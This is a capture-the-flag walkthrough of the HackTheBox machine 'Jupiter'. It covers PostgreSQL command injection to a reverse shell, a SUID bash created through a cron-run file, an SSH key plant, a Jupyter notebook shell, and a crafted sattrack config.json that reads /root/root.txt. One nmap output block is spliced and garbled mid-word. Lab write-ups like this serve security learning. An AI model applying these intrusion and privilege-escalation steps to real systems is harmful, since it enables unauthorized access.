

![1](</Writeups/Machines/Jupiter/img/logo.png>)
By Rug4lo

## Reconnaissance

We start with the usual nmap scan
```bash
nmap -p- --open -sS -min-rate 1000 -vvv -n -Pn -oG allPorts 10.10.11.216
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-10 16:22 CEST
Initiating SYN Stealth Scan at 16:22
Scanning 10.10.11.216 [65535 ports]
Discovered open port 22/tcp on 10.10.11.216
Discovered open port 80/tcp on 10.10.11.216
Completed SYN Stealth Scan at 16:22, 34.54s elapsed (65535 total ports)
Nmap scan report for 10.10.11.216
Host is up, received user-set (0.10s latency).
Scanned at 2023-10-10 16:22:17 CEST for 34s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 34.69 seconds
           Raw packets sent: 71835 (3.161MB) | Rcvd: 71834 (2.873MB)
```
We can run a more thorough scan 
```bash
nmap -sCV -p22,80 10.10.11.216 -oN Targeted 
```
```bash
Nmap scan report for jupiter.htb (10.10.11.216)
Host is up (0.16s latency).

PORT   STATE SERV[65535 ports]
Discovered open port 22/tcp on 10.10.11.216
Discovered open port 80/tcp on 10.10.11.216
Completed SYN Stealth Scan at 16:22, 34.54s elapsed (65535 total ports)
Nmap scan report for 10.10.11.216
Host is up, received user-set (0.10s latency).
Scanned at 2023-10-10 16:22:17 CEST for 34s
Not shown: 65533 clICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA)
|_  256 6001d7db927b13f0ba20c6c900a71b41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Home | Jupiter
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
Since there's nothing interesting here, let's go and dig into the website a bit

![1](</Writeups/Machines/Jupiter/img/1.png>)

If we browse around the site we won't be able to find anything, but if we start enumerating subdomains we'll find a very interesting one:
```bash
wfuzz -c --hc=403 --hw 12 -t 20 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.jupiter.htb" http://jupiter.htb/
```
```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://jupiter.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000001955:   200        211 L    798 W      34390 Ch    "kiosk"                                                                                                                
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
```
If we browse to that subdomain (remembering that it has to be added to /etc/hosts) we'll come across a fairly interesting page

![1](</Writeups/Machines/Jupiter/img/2.png>)

The page itself doesn't have much to it, but if we intercept the page's requests (the main one) with burpsuite we'll see something interesting:

![1](</Writeups/Machines/Jupiter/img/3.png>)

## Exploiting the query

In this request we can see that it sends a query against a **PostgreSQL** database, so after searching I found a way to execute commands within the query, and therefore I sent myself a reverse shell to my machine 

![1](</Writeups/Machines/Jupiter/img/4.png>)

The reverse shell will land in the other terminal and we can carry on

![1](</Writeups/Machines/Jupiter/img/5.png>)

## From Postgres to Juno

Now we have to escalate to the user Juno. To do this, if we use pspy we'll see that the user juno is running a .yml in /dev/shm; we can modify it so that it creates a bash copy in /temp and sets the suid bit on it

![1](</Writeups/Machines/Jupiter/img/6.png>)

If we wait a bit it will create a bash in tmp, with which we can become the user Juno

![1](</Writeups/Machines/Jupiter/img/7.png>)

To connect over ssh we can go to Juno's .ssh folder, drop in our id_rsa.pub and rename it to authorized_keys

![1](</Writeups/Machines/Jupiter/img/8.png>)

Now we log in over ssh and we already have user.txt

![1](</Writeups/Machines/Jupiter/img/9.png>)

## From Juno to Jovian

Now let's look at the groups this user belongs to, and we see the "science" group

![1](</Writeups/Machines/Jupiter/img/10.png>)

If we search for files owned by this group we'll see that in opt there are several logs we can read 

![1](</Writeups/Machines/Jupiter/img/11.png>)

If we read the most recent one we'll see a token for an internal service on the machine, which runs on port 8888

![1](</Writeups/Machines/Jupiter/img/12.png>)

If we set up port forwarding with ssh we'll be able to reach this service from our machine
```bash
ssh -L 8888:127.0.0.1:8888 juno@10.10.11.216
```
If we open the page we'll see the following

![1](</Writeups/Machines/Jupiter/img/13.png>)

Digging a bit we find that it has a section where we can run python code (we create a new .ipynb document)

If we drop a reverse shell in there we can gain access as the user jovian

![1](</Writeups/Machines/Jupiter/img/14.png>)

With this we now have access as the user Jovian

![1](</Writeups/Machines/Jupiter/img/15.png>)

## From Jovian to root

Now if we check this user's sudo permissions we'll find this:
```bash
sudo -l
```
```bash 
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```

This user can run that binary as root, and if we inspect it with the strings command we'll find that it reads a config.json
```bash
nano /usr/local/share/sattrack/config.json
```
We can copy this file to /tmp
```bash
cp config.json /tmp/config.json
```
```bash
chmod +x config.json 
```
And now modify it so that it copies the root flag for us
```bash
{
	"tleroot": "/tmp/tle/",
	"tlefile": "weather.txt",
	"mapfile": "/usr/local/share/sattrack/map.json",
	"texturefile": "/usr/local/share/sattrack/earth.png",
	
	"tlesources": [
                "file:///root/root.txt"
	],
	
	"updatePerdiod": 1000,
	
	"station": {
		"name": "LORCA",
		"lat": 37.6725,
		"lon": -1.5863,
		"hgt": 335.0
	},
	
	"show": [
	],
	
	"columns": [
		"name",
		"azel",
		"dis",
		"geo",
		"tab",
		"pos",
		"vel"
	]
}
```
Once that's done we run the binary, and this will create a tle folder inside which root.txt will be waiting

![1](</Writeups/Machines/Jupiter/img/16.png>)